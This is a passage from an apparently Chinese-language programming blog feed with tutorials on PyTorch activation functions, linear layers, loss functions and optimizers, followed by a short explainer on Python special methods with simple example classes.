PyTorch 中的激活函数模块，用于实现Sigmoid 激活函数。Sigmoid函数是一种常用的非线性激活函数，其数学表达式为： <spanclass="math display">\[\text{Sigmoid}(x) = \frac{1}{1 + e^{-x}}\]</span> Sigmoid 函数的输出范围是 <span class="math inline">\((0,1)\)</span>，因此可以将输入的任意实数映射到一个范围在 0 到 1之间的数值，常用于二分类问题中的输出层，表示样本属于某一类别的概率。</p><p>以下是一个简单的示例展示了如何在 PyTorch 中使用<code>torch.nn.Sigmoid</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 创建一个输入张量</span><br>input_tensor = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 示例输入张量的形状为 (2, 3)</span><br><br><span class="hljs-comment"># 创建一个 Sigmoid 激活函数实例</span><br>sigmoid = nn.Sigmoid()<br><br><span class="hljs-comment"># 将输入张量传递给 Sigmoid 激活函数进行激活操作</span><br>output_tensor = sigmoid(input_tensor)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input tensor:&quot;</span>)<br><span class="hljs-built_in">print</span>(input_tensor)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output tensor after Sigmoid activation:&quot;</span>)<br><span class="hljs-built_in">print</span>(output_tensor)<br></code></pre></td></tr></table></figure><p>在这个示例中，我们首先创建了一个输入张量<code>input_tensor</code>，形状为<code>(2, 3)</code>。然后，我们创建了一个 Sigmoid 激活函数的实例<code>sigmoid</code>，并将输入张量传递给这个激活函数进行激活操作。最后，输出的张量<code>output_tensor</code> 就是经过 Sigmoid 激活函数处理后的结果。</p><p>需要注意的是，Sigmoid激活函数会将输入张量中的每个元素都映射到一个范围在 0 到 1 之间的值。</p><h1 id="线性层">5. 线性层</h1><p><code>torch.nn.Linear</code> 是 PyTorch中用于创建线性（全连接）层的模块，也称为仿射变换。线性层将输入张量与权重矩阵相乘，然后加上偏置向量，得到输出张量。</p><p>线性层的数学表达式为： <span class="math display">\[\text{output} = \text{input} \times \text{weight}^T + \text{bias}\]</span> 其中： - <spanclass="math inline">\(\text{input}\)</span>是输入张量，形状为<spanclass="math inline">\((N, \text{in\_features})\)</span>，其中<spanclass="math inline">\(N\)</span>是批量大小，<spanclass="math inline">\(\text{in\_features}\)</span>是输入特征的数量。 -<spanclass="math inline">\(\text{weight}\)</span>是权重矩阵，形状为(out_features,in_features)，其中<spanclass="math inline">\(\text{out\_features}\)</span>是输出特征的数量。 -<span class="math inline">\(\text{bias}\)</span>是偏置向量，形状为<spanclass="math inline">\((\text{out\_features})\)</span>。</p><p>在 PyTorch 中，<code>torch.nn.Linear</code>的构造函数包含两个参数：<code>in_features</code> 和<code>out_features</code>，分别用于指定输入特征的数量和输出特征的数量。</p><p>以下是一个简单的示例，演示了如何在 PyTorch 中使用<code>torch.nn.Linear</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 创建一个线性层</span><br>linear_layer = nn.Linear(in_features=<span class="hljs-number">3</span>, out_features=<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 定义一个输入张量</span><br>input_tensor = torch.tensor([[<span class="hljs-number">1.0</span>, <span class="hljs-number">2.0</span>, <span class="hljs-number">3.0</span>]])<br><br><span class="hljs-comment"># 将输入张量传递给线性层进行计算</span><br>output_tensor = linear_layer(input_tensor)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input tensor:&quot;</span>)<br><span class="hljs-built_in">print</span>(input_tensor)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Output tensor after linear transformation:&quot;</span>)<br><span class="hljs-built_in">print</span>(output_tensor)<br></code></pre></td></tr></table></figure><p>在这个示例中，我们首先创建了一个线性层<code>linear_layer</code>，指定了输入特征数量为 3，输出特征数量为2。然后，我们创建了一个输入张量 <code>input_tensor</code>，形状为<code>(1, 3)</code>，表示一个批量大小为 1，输入特征数量为 3的张量。接下来，将输入张量传递给线性层进行计算，得到输出张量<code>output_tensor</code>，形状为<code>(1, 2)</code>，表示一个批量大小为 1，输出特征数量为 2 的张量。</p><h1 id="损失函数">6. 损失函数</h1><h2 id="l1loss">6.1 L1Loss</h2><p><code>torch.nn.L1Loss</code>是PyTorch中的一个损失函数，也称为绝对误差损失函数。它计算预测值和目标值之间的平均绝对误差。</p><p>下面是<code>torch.nn.L1Loss</code>的基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 示例</span><br>criterion = nn.L1Loss(size_average=<span class="hljs-literal">None</span>, reduce=<span class="hljs-literal">None</span>, reduction=<span class="hljs-string">&#x27;mean&#x27;</span>)<br><br><span class="hljs-comment"># 参数：</span><br><span class="hljs-comment"># size_average: 已弃用参数，将在将来版本中删除。请使用reduction参数代替。</span><br><span class="hljs-comment"># reduce: 已弃用参数，将在将来版本中删除。请使用reduction参数代替。</span><br><span class="hljs-comment"># reduction: 指定如何计算损失，默认为&#x27;mean&#x27;。可选值有：</span><br><span class="hljs-comment">#   - &#x27;none&#x27;: 不进行任何降维，保持输出形状与输入形状相同。</span><br><span class="hljs-comment">#   - &#x27;mean&#x27;: 对所有损失值求平均。</span><br><span class="hljs-comment">#   - &#x27;sum&#x27;: 对所有损失值求和。</span><br><br><span class="hljs-comment"># 示例：</span><br><span class="hljs-comment"># 创建一个L1Loss实例</span><br>criterion = nn.L1Loss()<br></code></pre></td></tr></table></figure><p>使用<code>L1Loss</code>的示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 创建损失函数实例</span><br>criterion = nn.L1Loss()<br><br><span class="hljs-comment"># 创建预测值和目标值张量</span><br>predictions = torch.tensor([<span class="hljs-number">0.9</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">3.3</span>], requires_grad=<span class="hljs-literal">True</span>)<br>targets = torch.tensor([<span class="hljs-number">1.0</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">3.0</span>])<br><br><span class="hljs-comment"># 计算损失</span><br>loss = criterion(predictions, targets)<br><br><span class="hljs-comment"># 打印损失值</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;L1 Loss:&quot;</span>, loss.item())<br></code></pre></td></tr></table></figure><p>在这个例子中，我们首先创建了一个<code>L1Loss</code>的实例。然后，我们创建了预测值张量<code>predictions</code>和目标值张量<code>targets</code>。接着，我们使用<code>criterion</code>计算了预测值和目标值之间的绝对误差损失，并通过<code>loss.item()</code>打印出损失值。</p><h2 id="mseloss">6.2 MSELoss</h2><p><code>torch.nn.MSELoss</code>是PyTorch中的均方误差损失函数，用于衡量预测值与目标值之间的平方误差的平均值。</p><p>下面是<code>torch.nn.MSELoss</code>的基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 示例</span><br>criterion = nn.MSELoss(size_average=<span class="hljs-literal">None</span>, reduce=<span class="hljs-literal">None</span>, reduction=<span class="hljs-string">&#x27;mean&#x27;</span>)<br><br><span class="hljs-comment"># 参数：</span><br><span class="hljs-comment"># size_average: 已弃用参数，将在将来版本中删除。请使用reduction参数代替。</span><br><span class="hljs-comment"># reduce: 已弃用参数，将在将来版本中删除。请使用reduction参数代替。</span><br><span class="hljs-comment"># reduction: 指定如何计算损失，默认为&#x27;mean&#x27;。可选值有：</span><br><span class="hljs-comment">#   - &#x27;none&#x27;: 不进行任何降维，保持输出形状与输入形状相同。</span><br><span class="hljs-comment">#   - &#x27;mean&#x27;: 对所有损失值求平均。</span><br><span class="hljs-comment">#   - &#x27;sum&#x27;: 对所有损失值求和。</span><br><br><span class="hljs-comment"># 示例：</span><br><span class="hljs-comment"># 创建一个MSELoss实例</span><br>criterion = nn.MSELoss()<br></code></pre></td></tr></table></figure><p>使用<code>MSELoss</code>的示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 创建损失函数实例</span><br>criterion = nn.MSELoss()<br><br><span class="hljs-comment"># 创建预测值和目标值张量</span><br>predictions = torch.tensor([<span class="hljs-number">0.9</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">3.3</span>], requires_grad=<span class="hljs-literal">True</span>)<br>targets = torch.tensor([<span class="hljs-number">1.0</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">3.0</span>])<br><br><span class="hljs-comment"># 计算损失</span><br>loss = criterion(predictions, targets)<br><br><span class="hljs-comment"># 打印损失值</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MSE Loss:&quot;</span>, loss.item())<br></code></pre></td></tr></table></figure><p>在这个例子中，我们首先创建了一个<code>MSELoss</code>的实例。然后，我们创建了预测值张量<code>predictions</code>和目标值张量<code>targets</code>。接着，我们使用<code>criterion</code>计算了预测值和目标值之间的均方误差损失，并通过<code>loss.item()</code>打印出损失值。</p><h2 id="crossentropyloss">6.3 CrossEntropyLoss</h2><p><code>torch.nn.CrossEntropyLoss</code>是PyTorch中用于多类别分类任务的损失函数。它将网络输出的原始分数（logits）与真实类别标签进行比较，并计算交叉熵损失。</p><p>下面是<code>torch.nn.CrossEntropyLoss</code>的基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 示例</span><br>criterion = nn.CrossEntropyLoss(weight=<span class="hljs-literal">None</span>, size_average=<span class="hljs-literal">None</span>, ignore_index=-<span class="hljs-number">100</span>, reduce=<span class="hljs-literal">None</span>, reduction=<span class="hljs-string">&#x27;mean&#x27;</span>)<br><br><span class="hljs-comment"># 参数：</span><br><span class="hljs-comment"># weight: 各个类别的损失权重，默认为None。</span><br><span class="hljs-comment"># size_average: 已弃用参数，将在将来版本中删除。请使用reduction参数代替。</span><br><span class="hljs-comment"># ignore_index: 忽略的类别标签，默认为-100。</span><br><span class="hljs-comment"># reduce: 已弃用参数，将在将来版本中删除。请使用reduction参数代替。</span><br><span class="hljs-comment"># reduction: 指定如何计算损失，默认为&#x27;mean&#x27;。可选值有：</span><br><span class="hljs-comment">#   - &#x27;none&#x27;: 不进行任何降维，保持输出形状与输入形状相同。</span><br><span class="hljs-comment">#   - &#x27;mean&#x27;: 对所有损失值求平均。</span><br><span class="hljs-comment">#   - &#x27;sum&#x27;: 对所有损失值求和。</span><br><br><span class="hljs-comment"># 示例：</span><br><span class="hljs-comment"># 创建一个CrossEntropyLoss实例</span><br>criterion = nn.CrossEntropyLoss()<br></code></pre></td></tr></table></figure><p>使用<code>CrossEntropyLoss</code>的示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><br><span class="hljs-comment"># 创建损失函数实例</span><br>criterion = nn.CrossEntropyLoss()<br><br><span class="hljs-comment"># 创建预测值张量和目标值张量</span><br>predictions = torch.tensor([[<span class="hljs-number">0.2</span>, <span class="hljs-number">0.8</span>], [<span class="hljs-number">0.9</span>, <span class="hljs-number">0.1</span>], [<span class="hljs-number">0.4</span>, <span class="hljs-number">0.6</span>]], requires_grad=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 预测值为logits</span><br>targets = torch.tensor([<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>])  <span class="hljs-comment"># 目标值为类别标签，从0开始</span><br><br><span class="hljs-comment"># 计算损失</span><br>loss = criterion(predictions, targets)<br><br><span class="hljs-comment"># 打印损失值</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;CrossEntropy Loss:&quot;</span>, loss.item())<br></code></pre></td></tr></table></figure><p>在这个例子中，我们首先创建了一个<code>CrossEntropyLoss</code>的实例。然后，我们创建了预测值张量<code>predictions</code>和目标值张量<code>targets</code>。预测值是一个大小为(3,2)的张量，每一行代表一个样本的logits，目标值是一个大小为(3,)的张量，每个元素是一个类别标签。接着，我们使用<code>criterion</code>计算了预测值和目标值之间的交叉熵损失，并通过<code>loss.item()</code>打印出损失值。</p><h2 id="作用">6.4 作用</h2><p>神经网络的损失函数（也称为代价函数或误差函数）在神经网络的训练过程中起着至关重要的作用。损失函数衡量的是模型预测值与实际值之间的差异，其目的是通过优化过程（如梯度下降法）最小化这一差异，从而提高模型的预测准确性。损失函数的选择对于网络的性能有重要影响。下面是损失函数在神经网络中的几个主要作用：</p><ol type="1"><li><p><strong>性能指标</strong>：损失函数提供了一个量化模型性能的指标，通过计算预测值与真实值之间的差距，我们可以了解模型的好坏。较低的损失值通常意味着模型有较好的性能。</p></li><li><p><strong>训练指导</strong>：损失函数是神经网络训练过程中优化算法的指导。优化算法（例如梯度下降）使用损失函数的梯度来更新网络权重，目的是减少损失函数的值，即减少预测误差。</p></li><li><p><strong>模型选择和比较</strong>：在模型选择或比较不同的神经网络架构时，损失函数提供了一个共同的基准。不同模型或架构的性能可以通过它们在相同损失函数下的表现来比较。</p></li><li><p><strong>正则化和避免过拟合</strong>：某些损失函数包含正则化项，如L1或L2正则化，这有助于控制模型的复杂度，避免过拟合。通过在损失函数中加入这些项，可以促使模型在学习数据的同时保持权重的小或稀疏，提高模型的泛化能力。</p></li><li><p><strong>特定任务适应性</strong>：不同类型的任务可能需要不同的损失函数。例如，回归问题常用均方误差（MSE）作为损失函数，而分类问题可能使用交叉熵损失函数。选择适合特定问题的损失函数是优化模型性能的关键。</p></li></ol><p>总之，损失函数在神经网络的设计和训练中扮演着核心角色，它不仅量化了模型的预测误差，还指导了模型的训练过程，帮助模型学习到数据中的模式，从而提高预测的准确性。</p><h1 id="优化器">7. 优化器</h1><p><code>torch.optim</code> 是 PyTorch中用于构建优化器的模块，它提供了多种优化算法来更新网络的权重和参数，从而最小化损失函数。这些优化算法包括但不限于SGD（随机梯度下降）、Adam、RMSprop 等。使用 <code>torch.optim</code>可以简化优化过程，使得模型训练更加高效和方便。</p><p>以下是使用 <code>torch.optim</code>的一个基本示例，我们将通过一个简单的线性回归模型来演示如何定义模型、损失函数以及如何使用优化器来更新模型参数：</p><ol type="1"><li><p><strong>导入必要的库</strong>： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.optim <span class="hljs-keyword">as</span> optim<br></code></pre></td></tr></table></figure></p></li><li><p><strong>定义模型</strong>： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinearRegressionModel</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(LinearRegressionModel, self).__init__()<br>        self.linear = nn.Linear(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># 输入特征维度为1，输出特征维度也为1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-keyword">return</span> self.linear(x)<br></code></pre></td></tr></table></figure></p></li><li><p><strong>初始化模型、损失函数和优化器</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">model = LinearRegressionModel()<br>criterion = nn.MSELoss()  <span class="hljs-comment"># 使用均方误差作为损失函数</span><br>optimizer = optim.SGD(model.parameters(), lr=<span class="hljs-number">0.01</span>)  <span class="hljs-comment"># 使用SGD作为优化器，学习率设置为0.01</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>训练模型</strong>： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 假设我们有一些训练数据 x_train 和 y_train</span><br>x_train = torch.tensor([[<span class="hljs-number">1.0</span>], [<span class="hljs-number">2.0</span>], [<span class="hljs-number">3.0</span>]])<br>y_train = torch.tensor([[<span class="hljs-number">2.0</span>], [<span class="hljs-number">4.0</span>], [<span class="hljs-number">6.0</span>]])<br><br><span class="hljs-comment"># 训练过程</span><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):  <span class="hljs-comment"># 训练100轮</span><br>    <span class="hljs-comment"># 前向传播：计算预测值</span><br>    outputs = model(x_train)<br>    loss = criterion(outputs, y_train)<br>    <br>    <span class="hljs-comment"># 后向传播和优化</span><br>    optimizer.zero_grad()  <span class="hljs-comment"># 清零梯度</span><br>    loss.backward()  <span class="hljs-comment"># 反向传播计算梯度</span><br>    optimizer.step()  <span class="hljs-comment"># 更新模型参数</span><br><br>    <span class="hljs-comment"># 打印每轮的损失</span><br>    <span class="hljs-keyword">if</span> (epoch+<span class="hljs-number">1</span>) % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Epoch [<span class="hljs-subst">&#123;epoch+<span class="hljs-number">1</span>&#125;</span>/100], Loss: <span class="hljs-subst">&#123;loss.item()&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure></p></li></ol><p>在这个示例中，我们首先定义了一个简单的线性回归模型，然后初始化模型、损失函数和优化器。训练过程包括前向传播、计算损失、后向传播以及通过优化器更新模型参数。我们使用<code>optimizer.zero_grad()</code>在每次迭代前清零梯度，以确保每次更新都是基于最新一轮的梯度计算；<code>loss.backward()</code>用于计算损失函数的梯度；<code>optimizer.step()</code>则根据这些梯度来更新模型的参数。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Pytorch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>特殊方法</title>
    <link href="/2024/03/03/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E7%89%B9%E6%AE%8A%E6%96%B9%E6%B3%95/"/>
    <url>/2024/03/03/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E7%89%B9%E6%AE%8A%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>Python的特殊方法（有时也称为魔法方法）是一组预定义的方法，你可以在你的类中实现这些方法来提供特定的操作或者行为。这些方法都是以双下划线（<code>__</code>）开头和结尾的。它们允许你实现和自定义对象的一些内置行为，例如迭代、调用、属性访问、运算符重载等。</p><p>以下是一些常用的特殊方法，以及如何在你的代码中使用它们的例子：</p><ol type="1"><li><code>__init__(self, [...])</code>：这是类的构造器。当类被实例化时，这个方法会被自动调用。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value</span>):<br>        self.value = value<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><code>__str__(self)</code>：当需要将对象转换为字符串时（比如打印），这个方法会被调用。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value</span>):<br>        self.value = value<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Example with value <span class="hljs-subst">&#123;self.value&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><ol start="3" type="1"><li><code>__repr__(self)</code>：这个方法用于官方的字符串表示，通常用于调试。它的目标是明确，不是可读性。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value</span>):<br>        self.value = value<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Example(<span class="hljs-subst">&#123;self.value&#125;</span>)&quot;</span><br></code></pre></td></tr></table></figure><ol start="4" type="1"><li><code>__add__(self, other)</code>：允许两个对象使用 <code>+</code>运算符进行加法操作。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value</span>):<br>        self.value = value<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, other</span>):<br>        <span class="hljs-keyword">return</span> Example(self.value + other.value)<br></code></pre></td></tr></table></figure><ol start="5" type="1"><li><code>__iter__(self)</code> 和<code>__next__(self)</code>：这两个方法使对象成为迭代器。<code>__iter__</code>返回迭代器对象本身，<code>__next__</code> 返回迭代器的下一个值。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, low, high</span>):<br>        self.current = low<br>        self.high = high<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> self<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__next__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> self.current &gt; self.high:<br>            <span class="hljs-keyword">raise</span> StopIteration<br>        <span class="hljs-keyword">else</span>:<br>            self.current += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">return</span> self.current - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ol start="6" type="1"><li><code>__getitem__(self, key)</code> 和<code>__setitem__(self, key, value)</code>：这两个方法允许对象使用下标操作，如列表或字典。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Indexer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.data = &#123;&#125;<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, key</span>):<br>        <span class="hljs-keyword">return</span> self.data.get(key, <span class="hljs-string">&quot;Not Found&quot;</span>)<br>        <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setitem__</span>(<span class="hljs-params">self, key, value</span>):<br>        self.data[key] = value<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>基础篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Transforms</title>
    <link href="/2024/03/03/Python/PyTorch/Transforms/"/>
    <url>/2024/03/03/Python/PyTorch/Transforms/</url>
    
